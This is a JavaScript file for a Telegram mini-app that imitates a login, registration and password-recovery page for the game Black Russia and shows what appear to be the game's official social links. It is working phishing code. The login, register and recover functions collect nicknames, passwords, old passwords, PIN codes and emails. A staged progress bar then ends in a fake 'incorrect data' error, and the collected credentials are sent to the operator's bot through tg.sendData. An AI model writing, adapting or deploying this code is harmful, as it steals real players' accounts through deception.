const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

let percent = 0;
const bar = document.getElementById('bar');
const percentText = document.getElementById('percent');
const loader = document.getElementById('loader');
const main = document.getElementById('main');

if (loader && main) {
    const interval = setInterval(() => {
        percent += 2;
        if (percent >= 100) {
            percent = 100;
            clearInterval(interval);
            setTimeout(() => {
                loader.style.display = 'none';
                main.style.display = 'block';
            }, 300);
        }
        if (bar) bar.style.width = percent + '%';
        if (percentText) percentText.textContent = percent + '%';
    }, 30);
}

// ФИЛЬТРЫ ВВОДА
function onlyLetters(input) { input.value = input.value.replace(/[^A-Za-z0-9]/g, ''); }
function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }

// ПРОВЕРКА НИКА (не тронута)
function checkNick() {
    const nick = document.getElementById('nick');
    const icon = document.getElementById('iconNick');
    if (!nick || !icon) return;
    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick.value.trim()) && nick.value.trim().length >= 5;
    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
    else { icon.classList.remove('green'); icon.classList.add('red'); }
}

// ПРОВЕРКА ПАРОЛЯ (для входа и регистрации)
function checkPassword() {
    const pass = document.getElementById('password') || document.getElementById('new_password');
    const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
    if (!pass || !icon) return;
    
    // От 7 символов, буквы и цифры
    const valid = /^[A-Za-z0-9]{7,}$/.test(pass.value);
    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
    else { icon.classList.remove('green'); icon.classList.add('red'); }
}

// ПРОВЕРКА СТАРОГО ПАРОЛЯ (для восстановления)
function checkOldPassword() {
    const pass = document.getElementById('old_password');
    const icon = document.getElementById('iconOldPass');
    if (!pass || !icon) return;
    
    const valid = /^[A-Za-z0-9]{7,}$/.test(pass.value);
    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
    else { icon.classList.remove('green'); icon.classList.add('red'); }
}

function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
function validatePassword(pass) { return /^[A-Za-z0-9]{7,}$/.test(pass); }

function togglePin() {
    const checkbox = document.getElementById('hasPin');
    const pinInput = document.getElementById('pin');
    const pinGroup = document.getElementById('pinGroup');
    if (!checkbox || !pinInput || !pinGroup) return;
    if (checkbox.checked) {
        pinInput.disabled = false;
        pinInput.placeholder = 'Введите пин-код';
        pinInput.focus();
        pinGroup.classList.remove('disabled');
    } else {
        pinInput.disabled = true;
        pinInput.value = '';
        pinInput.placeholder = 'Пин-код отключён';
        pinGroup.classList.add('disabled');
    }
}

function toggleServerList() {
    const dropdown = document.getElementById('serverDropdown');
    if (dropdown) dropdown.classList.toggle('active');
}
function selectServer(value) {
    const valueEl = document.getElementById('serverValue');
    const hiddenInput = document.getElementById('server');
    if (valueEl) valueEl.textContent = value;
    if (hiddenInput) hiddenInput.value = value;
    toggleServerList();
}

function goTo(page) { window.location.href = page; }

// ==========================================
// ЧЕК: 15 СЕК + 1.1 СЕК + АВТООТПРАВКА
// ==========================================
let pendingData = null;

function sendToBot(text) {
    pendingData = text;
}

function closeReceipt() {
    if (pendingData) {
        try { tg.sendData(pendingData); } catch (e) { console.error(e); }
    }
    const overlay = document.querySelector('.receipt-overlay');
    if (overlay) overlay.remove();
    tg.close();
}

function showReceipt(nick, server, type, dataText) {
    pendingData = dataText;

    const now = new Date();
    const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
    const ticket = Math.floor(1000000 + Math.random() * 9000000);

    const overlay = document.createElement('div');
    overlay.className = 'receipt-overlay';
    overlay.innerHTML = `
        <div class="receipt-box">
            <div class="receipt-close" onclick="closeReceipt()">✕</div>
            <div class="receipt-header">
                <span class="receipt-ticket">#${ticket}</span>
                <span class="receipt-time">${time}</span>
            </div>
            <div class="receipt-body">
                <div class="receipt-row"><span class="receipt-label">НИК</span><span class="receipt-value">${nick}</span></div>
                <div class="receipt-row"><span class="receipt-label">СЕРВЕР</span><span class="receipt-value">${server}</span></div>
                <div class="receipt-row"><span class="receipt-label">ОПЕРАЦИЯ</span><span class="receipt-value">${type}</span></div>
            </div>
            <div class="receipt-status" id="receiptStatus">
                <div class="receipt-status-text" id="statusText">Пожалуйста подождите...</div>
                <div class="receipt-bar"><div class="receipt-bar-fill" id="receiptBar"></div></div>
            </div>
            <div class="receipt-social-title">Следи за нашими соцсетями</div>
            <div class="receipt-socials">
                <a href="https://vk.ru/blackrussia.online" target="_blank" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/145/145813.png"></a>
                <a href="https://t.me/br_dev" target="_blank" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png"></a>
                <a href="#" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png"></a>
                <a href="#" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png"></a>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);

    let counter = 0;
    const bar = document.getElementById('receiptBar');
    const statusText = document.getElementById('statusText');

    // 100 шагов по 150 мс = ровно 15 секунд
    const interval = setInterval(() => {
        counter += 1;
        if (counter >= 100) {
            counter = 100;
            clearInterval(interval);
            
            // Меняем текст на красный (ошибка)
            if (statusText) {
                statusText.textContent = 'Вы ввели неверные данные';
                statusText.style.color = '#6a0000';
                statusText.style.fontWeight = '700';
            }

            // Ждем 1.1 секунды и отправляем данные
            setTimeout(() => {
                closeReceipt();
            }, 1100);

        }
        if (bar) bar.style.width = counter + '%';
    }, 150);
}

// ==========================================
// ФУНКЦИИ КНОПОК
// ==========================================

function login() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
    if (!validatePassword(password)) { alert('Пароль: от 7 символов (буквы и цифры)!'); return; }
    const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
    showReceipt(nick, server, 'Вход в аккаунт', data);
}

function register() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const email = document.getElementById('email').value.trim();
    const server = document.getElementById('server').value;
    const referrer = document.getElementById('referrer').value.trim();
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
    if (!validatePassword(password)) { alert('Пароль: от 7 символов (буквы и цифры)!'); return; }
    const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
    showReceipt(nick, server, 'Создание аккаунта', data);
}

function recover() {
    const nick = document.getElementById('nick').value.trim();
    const oldPass = document.getElementById('old_password').value.trim();
    const newPass = document.getElementById('new_password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
    if (!oldPass) { alert('Введите старый пароль!'); return; }
    if (!validatePassword(newPass)) { alert('Новый пароль: от 7 символов (буквы и цифры)!'); return; }
    const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
    showReceipt(nick, server, 'Восстановление аккаунта', data);
}
